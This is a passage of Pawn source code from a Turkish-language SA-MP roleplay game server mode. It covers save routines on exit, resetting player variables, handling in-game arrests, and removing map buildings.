	//mysql_query("TRUNCATE TABLE connections", THREAD_NO_RESULT, 0, g_MySQLConnections[0]);
	return 1;
}

public OnGameModeExit()
{
	SaveHouses();
	SaveDynamicMapIcons();
	SaveFamilies();
	SaveBiz();
	SaveGates();
	SaveFamiliesHQ();
	SaveDynamicDoors();
	SaveObjects();
    SaveObjects22();
	return 1;
}

forward FixHour(hour);
public FixHour(hour)
{
	hour = timeshift + hour;
	if(hour < 0)
	{
		hour = hour+24;
	}
	else if(hour > 23)
	{
		hour = hour-24;
	}
	shifthour = hour;
	return 1;
}

//----------------------[Remove Bomb]-----------------------
forward PickUpC4(playerid);
public PickUpC4(playerid)
{
   	DestroyDynamicObject(PlayerInfo[playerid][pC4]);
   	PlayerInfo[playerid][pC4] = 0;
	return 1;
}

forward SetPlayerFree(playerid,declare,reason[]);
public SetPlayerFree(playerid,declare,reason[])
{
	if(IsPlayerConnected(playerid))
	{
		ClearCrime(playerid);
		new turned[MAX_PLAYER_NAME];
		new turner[MAX_PLAYER_NAME];
		new crbjstore[128];
		if(declare == INVALID_PLAYER_ID)
		{
			format(turner, sizeof(turner), "911");
		}
		else
		{
			if(IsPlayerConnected(declare))
			{
				GetPlayerName(declare, turner, sizeof(turner));
			}
		}
		GetPlayerName(playerid, turned, sizeof(turned));
		foreach(Player, i)
		{
			if(IsACop(i))
			{
				format(crbjstore, sizeof(crbjstore), "Merkez: Tüm birimler, memur %s görevini baþarýyla tamamladý.",turner);
				SendClientMessage(i, COLOR_DBLUE, crbjstore);
				format(crbjstore, sizeof(crbjstore), "Merkez: %s adlý suçlu veritabanýna iþlendi, %s.",turned,reason);
				SendClientMessage(i, COLOR_DBLUE, crbjstore);
			}
		}
	}
}

public OnPlayerRequestClass(playerid, classid)
{
	/*SetPlayerPos(playerid, 1958.3783, 1343.1572, 15.3746);
	SetPlayerCameraPos(playerid, 1958.3783, 1343.1572, 15.3746);
	SetPlayerCameraLookAt(playerid, 1958.3783, 1343.1572, 15.3746);*/
	SpawnPlayer(playerid);
	TextDrawHideForPlayer(playerid, ZhaoByMetehan0);
	TextDrawHideForPlayer(playerid, ZhaoByMetehan1);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan2);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan3);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan4);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan5);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan6);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan7);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan8);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan9);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan10);
    TextDrawHideForPlayer(playerid, ZhaoByMetehan11);

	return 1;
}

stock IsStringAlphaNumeric(string[]) {
	new
	    i;

	static const
 		szAppropriateCharacters[] = { "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_" };

	for(new c = 0; c < strlen(string); c++) {
	    for(new f = 0; f < sizeof(szAppropriateCharacters); f++) {
            if(string[c] == szAppropriateCharacters[f])
                i++;
		}
	}

	if(i < strlen(string)) return 0;

	return 1;
}

stock ResetPlayerVariables(playerid) {
	ResetPlayerWeapons(playerid);
	if(AdminDuty[playerid] != 0) {
		TogglePlayerControllable(playerid, 1);
		ClearAnimations(playerid, 1);

		SetPVarInt(playerid, "washereforpaycheck", WasHereForPaycheck[playerid]);
		SetPVarInt(playerid, "signedpaycheck", SignedPaycheck[playerid]);
		SetPVarInt(playerid, "missedpaychecks", MissedPaychecks[playerid]);
		SetPVarInt(playerid, "paycheckcode", PayCheckCode[playerid]);
		SetPVarInt(playerid, "payready", PlayerInfo[playerid][pPayReady]);
		SetPVarInt(playerid, "paycheck", PlayerInfo[playerid][pPayCheck]);
		AdminLoggedInBefore[playerid] = 1;
		AdminDuty[playerid] = 0;
		DeletePVar(playerid, "AdminUndercover");

		new username[MAX_PLAYER_NAME];
		GetPVarString(playerid, "TempNameName", username, sizeof(username));
		SetPVarInt(playerid, "TempName", 0);

		SetPlayerName(playerid, username);
	} else {
		AdminRelogPassword[playerid][0] = 0;
		AdminLoggedInBefore[playerid] = 0;
		for(new i = 0; i < 3; i++)
		{
			TeleportDest[playerid][i] = 0;
		}
		for(new i = 0; i < 3; i++)
		{
			TeleportDest2[playerid][i] = 0;
		}
		IsBoundsShowingFFC[playerid] = 0;
		IsBoundsShowingMP1[playerid] = 0;
		IsBoundsShowingMF1[playerid] = 0;
		IsBoundsShowingMP2[playerid] = 0;
		IsBoundsShowingMF2[playerid] = 0;
		IsBoundsShowingAEC[playerid] = 0;
		IsBoundsShowingDH[playerid] = 0;
		IsBoundsShowingCL[playerid] = 0;
		IsBoundsShowingDF[playerid] = 0;
		GlobalChat[playerid] = 0;
		GlobalChatTimer[playerid] = 0;
		// Start of boombox
		BoomBoxSet[playerid] = 0;
		BoomboxInfo[playerid][bbPosX] = 0.0;
		BoomboxInfo[playerid][bbPosY] = 0.0;
		BoomboxInfo[playerid][bbPosZ] = 0.0;
		BoomboxInfo[playerid][bbInt] = 0;
		BoomboxInfo[playerid][bbVW] = 0;
		BoomboxInfo[playerid][bbStation] = 0;
		BoomboxInfo[playerid][bbSetBy] = 999;
		BoomboxInfo[playerid][bbObject] = 0;
		// End of boombox
		ValidArmor[playerid] = 0;
		ResetPlayerWeapons(playerid);
		// Weapons
		for(new s = 0; s < 12; s++)
		{
			PlayerInfo[playerid][pAGuns][s] = 0; // Admin spawned, non-saved
			PlayerInfo[playerid][pGuns][s] = 0;
		}
		for(new v = 0; v < MAX_PLAYERVEHICLES; v++)
		{
			PlayerVehicleInfo[playerid][v][pvId] = INVALID_PLAYER_VEHICLE_ID;
			PlayerVehicleInfo[playerid][v][pvRealID] = 0;
			PlayerVehicleInfo[playerid][v][pvModelId] = 0;
			PlayerVehicleInfo[playerid][v][pvPosX] = 0.0;
			PlayerVehicleInfo[playerid][v][pvPosY] = 0.0;
			PlayerVehicleInfo[playerid][v][pvPosZ] = 0.0;
			PlayerVehicleInfo[playerid][v][pvPosAngle] = 0.0;
			PlayerVehicleInfo[playerid][v][pvLock] = 0;
			PlayerVehicleInfo[playerid][v][pvLocked] = 0;
			PlayerVehicleInfo[playerid][v][pvPaintJob] = -1;
			PlayerVehicleInfo[playerid][v][pvColor1] = 0;
			PlayerVehicleInfo[playerid][v][pvImpounded] = 0;
			PlayerVehicleInfo[playerid][v][pvSpawned] = 0;
			PlayerVehicleInfo[playerid][v][pvColor2] = 0;
			PlayerVehicleInfo[playerid][v][pvPrice] = 0;
			PlayerVehicleInfo[playerid][v][pvTicket] = 0;
			PlayerVehicleInfo[playerid][v][pvWeapons][0] = 0;
			PlayerVehicleInfo[playerid][v][pvWeapons][1] = 0;
			PlayerVehicleInfo[playerid][v][pvWeapons][2] = 0;
			PlayerVehicleInfo[playerid][v][pvWepUpgrade] = 0;
			PlayerVehicleInfo[playerid][v][pvFuel] = 100.0;
			PlayerVehicleInfo[playerid][v][pvAllowedplayerid] = INVALID_PLAYER_ID;
			PlayerVehicleInfo[playerid][v][pvPark] = 0;
			ListItemReleaseId[playerid][v] = -1;
			PlayerVehicleInfo[playerid][v][pvDisabled] = 0;
			PlayerVehicleInfo[playerid][v][pvSpawned] = 0;
			format(PlayerVehicleInfo[playerid][v][pvNumberPlate], 32, "Plaka Yok");
			ListItemTrackId[playerid][v] = -1;
			for(new m = 0; m < MAX_MODS; m++)
			{
				PlayerVehicleInfo[playerid][v][pvMods][m] = 0;
			}
		}
		for(new v = 0; v < MAX_PLAYERVEHICLES; v++) {
			PlayerVehicleInfo[playerid][v][pvAllowedplayerid] = INVALID_PLAYER_ID;
		}
	}
	SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, 1);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_MICRO_UZI, 1);

	DeletePVar(playerid, "PBM");
	DeletePVar(playerid, "PBMK");
	DeletePVar(playerid, "PBMD");
	DeletePVar(playerid, "PBMS");
	DeletePVar(playerid, "Injured");
	DeletePVar(playerid, "EventToken");
	DeletePVar(playerid, "EventAnims");
	SetPVarInt(playerid, "IsInArena", -1);
	SetPVarInt(playerid, "MovingStretcher", -1);
	SetPVarInt(playerid, "editingcd", -1);
	SetPVarInt(playerid, "editingcdveh", -1);

	SetPVarInt(playerid, "AdminUndercover", 0);

	SetPlayerColor(playerid,TEAM_HIT_COLOR);

	if(IsValidDynamic3DTextLabel(Helper[playerid])) DestroyDynamic3DTextLabel(Helper[playerid]);

	// Player file variables (kayitseg)
	if(GetPVarInt(playerid, "attemptLoginAfter") == 0)
		PlayerInfo[playerid][pKey] = 0;

	PlayerInfo[playerid][pID] = 0;
	PlayerInfo[playerid][pLiveBanned] = 0;
	PlayerInfo[playerid][pLevel] = 1;
	PlayerInfo[playerid][pAdmin] = 0;
	format(PlayerInfo[playerid][pAdminName], 32, "0");
	PlayerInfo[playerid][pBanAppealer] = 0;
	PlayerInfo[playerid][pBanned] = 0;
	PlayerInfo[playerid][pPermaBanned] = 0;
	PlayerInfo[playerid][pDisabled] = 0;
	PlayerInfo[playerid][pIP] = 0;
	PlayerInfo[playerid][pReg] = 0;
	PlayerInfo[playerid][pTut] = 0;
	PlayerInfo[playerid][pSex] = 1;
	PlayerInfo[playerid][pGangMod] = 0;
	PlayerInfo[playerid][pAge] = 0;
	PlayerInfo[playerid][pSkin] = 311;
	PlayerInfo[playerid][pPos_x] = 0;
	PlayerInfo[playerid][pPos_y] = 0;
	PlayerInfo[playerid][pPos_z] = 3.14;
	PlayerInfo[playerid][pPos_r] = 0;
	PlayerInfo[playerid][pConnectTime] = 0;
	PlayerInfo[playerid][pRespect] = 0;
	PlayerInfo[playerid][pNumber] = 0;
	PlayerInfo[playerid][pWarns] = 0;
	PlayerInfo[playerid][pGang] = 255;
	PlayerInfo[playerid][pTriageTime] = 0;
	PlayerInfo[playerid][pFaction] = 0;
	PlayerInfo[playerid][pLeader] = 0;
	PlayerInfo[playerid][pRank] = 0;
	PlayerInfo[playerid][pJob] = 0;
	PlayerInfo[playerid][pJob2] = 0;
	PlayerInfo[playerid][pDonator] = 0;
	PlayerInfo[playerid][gPupgrade] = 0;
	PlayerInfo[playerid][pSarmor] = 0;
	PlayerInfo[playerid][pCash] = 1500;
	TalkingLive[playerid] = INVALID_PLAYER_ID;
	PlayerInfo[playerid][pBank] = 0;
	PlayerInfo[playerid][pInsurance] = 0;
	PlayerInfo[playerid][pCrimes] = 0;
	PlayerInfo[playerid][pArrested] = 0;
	PlayerInfo[playerid][pWantedLevel] = 0;
	PlayerInfo[playerid][pHealth] = 100;
	PlayerInfo[playerid][pArmor] = 0;
	PlayerInfo[playerid][pPot] = 0;
	PlayerInfo[playerid][pCrack] = 0;
	PlayerInfo[playerid][pPackages] = 0;
	PlayerInfo[playerid][pCrates] = 0;
	PlayerInfo[playerid][pRadio] = 0;
	PlayerInfo[playerid][pRadioFreq] = 0;
	PlayerInfo[playerid][pMats] = 0;
	PlayerInfo[playerid][pRope] = 0;
	PlayerInfo[playerid][pCigar] = 0;
	PlayerInfo[playerid][pSprunk] = 0;
	PlayerInfo[playerid][pSpraycan] = 0;
	PlayerInfo[playerid][pHouse] = INVALID_HOUSE_ID;
	PlayerInfo[playerid][pHouse2] = INVALID_HOUSE_ID;
	PlayerInfo[playerid][pRenting] = INVALID_HOUSE_ID;
	PlayerInfo[playerid][pBiz] = 0;
	PlayerInfo[playerid][pVBiz] = 0;
	PlayerInfo[playerid][pInt] = 0;
	PlayerInfo[playerid][pVW] = 0;
	PlayerInfo[playerid][pPetKontrol] = 0;
    PlayerInfo[playerid][pPet] = 0;
    format(PlayerInfo[playerid][pPetAdi],32,"0");
    PlayerInfo[playerid][pPetCani] = 0;
    PlayerInfo[playerid][pPetKontrol] = 0;
    PlayerInfo[playerid][pPetTuru] = 0;
	PlayerInfo[playerid][pJailed] = 0;
	PlayerInfo[playerid][pJailTime] = 0;
	PlayerInfo[playerid][pPayCheck] = 0;
	PlayerInfo[playerid][pPayReady] = 0;
	PlayerInfo[playerid][pDetSkill] = 0;
	PlayerInfo[playerid][pLawSkill] = 0;
	PlayerInfo[playerid][pSexSkill] = 0;
	PlayerInfo[playerid][pDrugsSkill] = 0;
	PlayerInfo[playerid][pSmugSkill] = 0;
	PlayerInfo[playerid][pArmsSkill] = 0;
	PlayerInfo[playerid][pMechSkill] = 0;
	PlayerInfo[playerid][pFishSkill] = 0;
	PlayerInfo[playerid][pBoxSkill] = 0;
	PlayerInfo[playerid][pTruckSkill] = 0;
	PlayerInfo[playerid][pCarSkill] = 0;
	PlayerInfo[playerid][pLawyerTime] = 0;
	PlayerInfo[playerid][pLawyerFreeTime] = 0;
	PlayerInfo[playerid][pDrugsTime] = 0;
	PlayerInfo[playerid][pMechTime] = 0;
	PlayerInfo[playerid][pSexTime] = 0;
	PlayerInfo[playerid][pCarTime] = 0;
	PlayerInfo[playerid][pFishes] = 0;
	PlayerInfo[playerid][pBiggestFish] = 0;
	PlayerInfo[playerid][pWeedObject] = 0;
	PlayerInfo[playerid][pWeedPos][0] = 0;
	PlayerInfo[playerid][pWeedPos][1] = 0;
	PlayerInfo[playerid][pWeedPos][2] = 0;
	PlayerInfo[playerid][pWeedVW] = 0;
	PlayerInfo[playerid][pWeedInt] = 0;
	PlayerInfo[playerid][pWeedGrowth] = -1;
	PlayerInfo[playerid][pWSeeds] = 0;
	PlayerInfo[playerid][pFightStyle] = FIGHT_STYLE_NORMAL;
	PlayerInfo[playerid][pScrewdriver] = 0;
	PlayerInfo[playerid][pSmslog] = 0;
	PlayerInfo[playerid][pWristwatch] = 0;
	PlayerInfo[playerid][pTire] = 0;
	PlayerInfo[playerid][pFirstaid] = 0;
	PlayerInfo[playerid][pRccam] = 0;
	PlayerInfo[playerid][pReceiver] = 0;
	PlayerInfo[playerid][pGPS] = 0;
	PlayerInfo[playerid][pSweep] = 0;
	PlayerInfo[playerid][pSweepLeft] = 0;
	PlayerInfo[playerid][pVehicleKeys] = INVALID_PLAYER_VEHICLE_ID; // non-saved
	PlayerInfo[playerid][pVehicleKeysFrom] = INVALID_PLAYER_ID; // non-saved
	PlayerInfo[playerid][pCarLic] = 1;
	PlayerInfo[playerid][pFlyLic] = 0;
	PlayerInfo[playerid][pBoatLic] = 1;
	PlayerInfo[playerid][pFishLic] = 1;
	PlayerInfo[playerid][pGunLic] = 1;
	PlayerInfo[playerid][pDivision] = 0;
	PlayerInfo[playerid][pTicketTime] = 0;
	PlayerInfo[playerid][pHeadValue] = 0;
	strcpy(PlayerInfo[playerid][pContractBy], "Nobody", 64);
	strcpy(PlayerInfo[playerid][pContractDetail], "Yok", 64);
	PlayerInfo[playerid][pC4] = 0;
	PlayerInfo[playerid][pC4Used] = 0;
	PlayerInfo[playerid][pBombs] = 0;
	PlayerInfo[playerid][pCHits] = 0;
	PlayerInfo[playerid][pFHits] = 0;
	strcpy(PlayerInfo[playerid][pPrisonedBy], "Nobody", 64);
	strcpy(PlayerInfo[playerid][pPrisonReason], "Yok", 64);
	PlayerInfo[playerid][pAcceptReport] = 0;
	PlayerInfo[playerid][pTrashReport] = 0;
	PlayerInfo[playerid][pAccent] = 0;
	PlayerInfo[playerid][pNMute] = 0;
	PlayerInfo[playerid][pNMuteTotal] = 0;
	PlayerInfo[playerid][pADMute] = 0;
	PlayerInfo[playerid][pADMuteTotal] = 0;
	PlayerInfo[playerid][pRMuted] = 0;
	PlayerInfo[playerid][pRMutedTotal] = 0;
	PlayerInfo[playerid][pRMutedTime] = 0;
	PlayerInfo[playerid][pSpeedo] = 0;
	PlayerInfo[playerid][pGCMuted] = 0;
	PlayerInfo[playerid][pGCMutedTime] = 0;
	PlayerInfo[playerid][pCallsAccepted] = 0;
	PlayerInfo[playerid][pPatientsDelivered] = 0;
	PlayerInfo[playerid][pTriageTime] = 0;
	for(new v = 0; v < MAX_PLAYERTOYS; v++)
	{
		PlayerToyInfo[playerid][v][ptModelID] = 0;
		PlayerToyInfo[playerid][v][ptBone] = 1;
        PlayerToyInfo[playerid][v][ptRealID] = 0;
		PlayerToyInfo[playerid][v][ptPosX] = 0.0;
		PlayerToyInfo[playerid][v][ptPosY] = 0.0;
		PlayerToyInfo[playerid][v][ptPosZ] = 0.0;
		PlayerToyInfo[playerid][v][ptRotX] = 0.0;
		PlayerToyInfo[playerid][v][ptRotY] = 0.0;
		PlayerToyInfo[playerid][v][ptRotZ] = 0.0;
		PlayerToyInfo[playerid][v][ptScaleX] = 1.0;
		PlayerToyInfo[playerid][v][ptScaleY] = 1.0;
		PlayerToyInfo[playerid][v][ptScaleZ] = 1.0;
	}
	PlayerInfo[playerid][pKillLog0][0] = 0;
	PlayerInfo[playerid][pKillLog1][0] = 0;
	PlayerInfo[playerid][pKillLog2][0] = 0;
	PlayerInfo[playerid][pKillLog3][0] = 0;
	PlayerInfo[playerid][pKillLog4][0] = 0;
	PlayerInfo[playerid][pKillLog5][0] = 0;
	PlayerInfo[playerid][pKillLog6][0] = 0;
	PlayerInfo[playerid][pKillLog7][0] = 0;
	PlayerInfo[playerid][pKillLog8][0] = 0;
	PlayerInfo[playerid][pRMutedTime] = 0;
	PlayerInfo[playerid][pRMutedTotal] = 0;
	PlayerInfo[playerid][pPatientsDelivered] = 0;
	PlayerInfo[playerid][pKillLog9][0] = 0;
	strcpy(PlayerInfo[playerid][pFlag], "", 128);
	strcpy(PlayerInfo[playerid][pReferredBy], "0", 32);
	PlayerInfo[playerid][pRefTokens] = 0;
    PlayerInfo[playerid][pRefTokensOffline] = 0;
    PlayerInfo[playerid][pHelper] = 0;
	PlayerInfo[playerid][pWalkStyle] = 0;
	PlayerInfo[playerid][pGate1] = 0;
	PlayerInfo[playerid][pGate2] = 0;
	PlayerInfo[playerid][pGate3] = 0;
	PlayerInfo[playerid][pBlindfold] = 0;
    PlayerInfo[playerid][pGas] = 0;

	// Other player variables (non-saving)
	for(new s = 0; s < 40; s++)
	{
		ListItemReportId[playerid][s] = -1;
	}
	for(new i = 0; i < 6; i++)
	{
		HHcheckFloats[playerid][i] = 0;
	}
	HHcheckInt[playerid] = 0;
	HHcheckVW[playerid] = 0;
	for(new i = 0; i < 3; i++) {
		StopaniFloats[playerid][i] = 0;
	}
	SetPVarInt(playerid, "NameChangeCost", 0);
	JustSuicided[playerid] = 0;
	FuelBar[playerid] = INVALID_BAR_ID;
	HelperPM[playerid] = INVALID_PLAYER_ID;
	SpeakerPhone[playerid] = 0;
	LastSMS[playerid] = 0;
	PlayerDragged[playerid] = 0;
	PlayerDraggedBy[playerid] = INVALID_PLAYER_ID;
	IsCopDragging[playerid] = INVALID_PLAYER_ID;
	PaintballTeam[playerid] = 0;
	EventTeam[playerid] = -1;
	TeleportDestInt[playerid] = 0;
	TeleportDestInt2[playerid] = 0;
	gPlayerAccount[playerid] = 0;
	gPlayerLogTries[playerid] = 0;
	gPlayerLogged[playerid] = 0;
	InsideMainMenu[playerid] = 1;
	InsideTut[playerid] = 1;
	ActiveChatbox[playerid] =  0;
	PlayerCuffed[playerid] = 0;
	Spectate[playerid] = 999;
	Spectating[playerid] = 0;
	GettingSpectated[playerid] = 999;
	InsideShamal[playerid]= INVALID_VEHICLE_ID;
	HouseOffer[playerid] = 999;
	House[playerid] = 0;
	HousePrice[playerid] = 0;
	hInviteHouse[playerid]=INVALID_HOUSE_ID;
	hInviteOffer[playerid]=999;
	playerTabbed[playerid] = 0;
 	playerTabbedTime[playerid] = 0;
	playerAFK[playerid] = 0;
	playerAFKTime[playerid] = 0;
	playerLastTyped[playerid] = 0;
	pCurrentWeapon[playerid] = 0;
	JetPack[playerid] = 0;
	TextSpamTimes[playerid] = 0;
	TextSpamUnmute[playerid] = 0;
 	CommandSpamTimes[playerid] = 0;
	CommandSpamUnmute[playerid] = 0;
	gLastCar[playerid] = 0;
	LiveOffer[playerid] = INVALID_PLAYER_ID;
	IsTheReporter[playerid] = 0;
	GettingJob[playerid] = 0;
	GettingJob2[playerid] = 0;
	PayCheckCode[playerid] = 0;
	AdminDuty[playerid] = 0;
	FindTimePoints[playerid] = 0;
	FindingPlayer[playerid] = 0;
	FindTime[playerid] = 0;
	UsedFind[playerid] = 0;
	Condom[playerid] = 0;
	SexOffer[playerid] = 999;
	SexPrice[playerid] = 0;
	gFam[playerid] = 0;
	InviteOffer[playerid]=999;
	InviteFaction[playerid]=0;
	InviteFamily[playerid]=255;
	PotOffer[playerid] = 999;
	CrackOffer[playerid] = 999;
	PotPrice[playerid]=0;
	CrackPrice[playerid]=0;
	PotGram[playerid]=0;
	CrackGram[playerid]=0;
	JobDuty[playerid]=0;
	WantLawyer[playerid]=0;
	CallLawyer[playerid]=0;
	JailPrice[playerid]=0;
	DefendOffer[playerid] = 999;
	DefendPrice[playerid] = 0;
	CP[playerid] = 0;
	GuardOffer[playerid] = 999;
 	GuardPrice[playerid]=0;
 	GunOffer[playerid] = 999;
  	GunId[playerid] = 0;
   	GunMats[playerid] = 0;
	MatsOffer[playerid] = 999;
	MatsPrice[playerid] = 0;
	MatsAmount[playerid] = 0;
	PlayerBoxing[playerid]=0;
	BoxOffer[playerid] = 999;
	BoxWaitTime[playerid]=0;
	UsedCrack[playerid] = 0;
	UsedWeed[playerid] = 0;
	PlayerStoned[playerid] = 0;
	TransportDuty[playerid]=0;
	TransportValue[playerid] = 0;
	TransportMoney[playerid] = 0;
	TransportTime[playerid] = 0;
	TransportCost[playerid] = 0;
	TransportDriver[playerid] = 999;
	ConsumingMoney[playerid] = 0;
	BusCallTime[playerid]=0;
	BusAccepted[playerid] = 999;
	TaxiCallTime[playerid]=0;
	TaxiAccepted[playerid] = 999;
	DrinkOffer[playerid] =  INVALID_PLAYER_ID;
	Fishes[playerid][pLastFish] = 0;
	Fishes[playerid][pFishID] = 0;
	FishCount[playerid]=0;
	CraftOffer[playerid] = 999;
	CraftId[playerid]=0;
	CraftMats[playerid]=0;
	VehicleSpawned[playerid] = 0;
	VehicleOffer[playerid] = 999;
	VehiclePrice[playerid] = 0;
	VehicleId[playerid] = -1;
	GiveKeysTo[playerid] = INVALID_PLAYER_ID;
	HouseKey[playerid] = INVALID_HOUSE_ID;
	RepairCar[playerid]=0;
	OnDuty[playerid]=0;
	ConnectedToPC[playerid]=0;
	PlayerCuffedTime[playerid]=0;
	PhoneOnline[playerid] = 0;
	pTazer[playerid] = 0;
	pTazerReplace[playerid] = 0;
	TazerTimeout[playerid] = 0;
	TicketOffer[playerid] = 999;
	TicketMoney[playerid] = 0;
	arr_Towing[playerid] = INVALID_VEHICLE_ID;
	Fixr[playerid] = 0;
	gBug[playerid] = 1;
	GotHit[playerid]=0;
	GoChase[playerid]=999;
	GetChased[playerid]=999;
	HitOffer[playerid]=999;
	HitToGet[playerid]=999;
	JustReported[playerid] = -1;
	CancelReport[playerid] = -1;
	NewbieTimer[playerid] = 0;
	gNewbie[playerid] = 0;
	for(new i = 0; i < 6; i++) {
	    EventFloats[playerid][i] = 0.0;
	}
	EventLastInt[playerid] = 0; EventLastVW[playerid] = 0;
	Mobile[playerid]=INVALID_PLAYER_ID;
	CellTime[playerid] = 0;
	CalledCops[playerid]=0;
	CopsCallTime[playerid]=0;
	CalledMedics[playerid]=0;
	MedicsCallTime[playerid]=0;
	Music[playerid]=0;
	PlayerTied[playerid]=0;
	gRadio[playerid] = 1;
	CallCost[playerid] = 0;
    szAdvert[playerid][0] = 0;
	LoadTruckBar[playerid] = INVALID_BAR_ID;
	LoadTruckTime[playerid] = 0;
	TruckDeliver[playerid] = 0;
	TruckUsed[playerid] = INVALID_VEHICLE_ID;
	EMSCallTime[playerid]=0;
	EMSAccepted[playerid]=INVALID_PLAYER_ID;
	MedicCallTime[playerid]=0;
	MedicAccepted[playerid] = 999;
	MechanicCallTime[playerid]=0;
	DivorceOffer[playerid] = 999;
	MarryWitness[playerid] = 999;
	MarryWitnessOffer[playerid] = 999;
	MarriageCeremoney[playerid] = 0;
	ProposeOffer[playerid] = 999;
	ProposedTo[playerid] = 999;
	GotProposedBy[playerid] = 999;
	slotselection[playerid] = 0;
	ServiceTime[playerid] = 0;
	WasHereForPaycheck[playerid] = 0;
	SignedPaycheck[playerid] = 0;
	MissedPaychecks[playerid] = 0;
	HidePM[playerid] = 0;
	Backup[playerid] = 0;
	RadarActive[playerid] = 0;
	RadarWarning[playerid] = 0;
	FindingJob[playerid] = 0;
	FindingDealership[playerid] = 0;
	ShakeHandRequest[playerid] = 999;
	ShakeHandStyle[playerid] = 0;
	TutorialProgress[playerid] = 0;
	PhonePrivacy[playerid] = 0;
	MP3Station[playerid] = 0;

 	ClearCrime(playerid);
	ClearFishes(playerid);
	ClearMarriage(playerid);

	if(AdminLoggedInBefore[playerid] == 1) {
		WasHereForPaycheck[playerid] = GetPVarInt(playerid, "washereforpaycheck");
		SignedPaycheck[playerid] = GetPVarInt(playerid, "signedpaycheck");
		MissedPaychecks[playerid] = GetPVarInt(playerid, "missedpaychecks");
		PayCheckCode[playerid] = GetPVarInt(playerid, "paycheckcode");
		PlayerInfo[playerid][pPayReady] = GetPVarInt(playerid, "payready");
		PlayerInfo[playerid][pPayCheck] = GetPVarInt(playerid, "paycheck");
	}

	DeletePVar(playerid, "washereforpaycheck");
	DeletePVar(playerid, "signedpaycheck");
	DeletePVar(playerid, "missedpaychecks");
	DeletePVar(playerid, "paycheckcode");
	DeletePVar(playerid, "payready");
	DeletePVar(playerid, "paycheck");


	// Removal of hell hole (VIP Lounge)
	RemoveBuildingForPlayer(playerid, 3999, 1785.9766, -1564.8594, 25.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 4079, 1785.9766, -1564.8594, 25.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 4189, 1794.6172, -1576.7344, 17.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 1822.1563, -1543.7891, 12.6328, 0.25);

	//kakalý
	RemoveBuildingForPlayer(playerid, 5324, 2240.9375, -2590.6797, 18.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2114.5547, -1928.1875, 5.0313, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2113.3984, -1925.0391, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2115.6719, -1922.7656, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2123.3594, -1928.0703, 6.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2122.6563, -1916.7891, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2116.9297, -1916.0781, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2121.5078, -1909.5313, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2110.2734, -1906.5859, 5.0313, 0.25);
	//pizza
	RemoveBuildingForPlayer(playerid, 1408, 2099.8516, -1813.9063, 13.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 2128.3125, -1826.8359, 12.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2105.0859, -1765.6094, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2114.7188, -1785.1797, 16.3984, 0.25);
	//pizzabitis
	// MARKETBAR SÝLÝNCEK
    RemoveBuildingForPlayer(playerid, 792, 1050.1328, -1566.4375, 12.6406, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1119.6016, -1566.4375, 12.6250, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1105.6094, -1566.4375, 12.5781, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1075.6484, -1566.4375, 12.5938, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1117.6094, -1536.9766, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1111.5625, -1533.9609, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1105.6016, -1531.1563, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1169.9297, -1577.8828, 12.6719, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1186.7344, -1578.0000, 12.7813, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1206.9141, -1578.0000, 12.7813, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1247.6328, -1578.0000, 12.7813, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1264.1641, -1578.0000, 12.7813, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1280.5859, -1578.0000, 12.7813, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1141.5781, -1566.4375, 12.6172, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1159.6094, -1566.4375, 12.6406, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1185.5313, -1566.4375, 12.6250, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1219.8516, -1561.3359, 12.6172, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1190.2578, -1545.6016, 12.6641, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1219.8516, -1547.8984, 12.6172, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1137.9297, -1537.0625, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1143.7891, -1534.7031, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1219.8516, -1534.4688, 12.6172, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1148.6016, -1532.2578, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1097.4766, -1523.9766, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1093.4219, -1519.8281, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1089.5781, -1515.7891, 30.9688, 0.25);
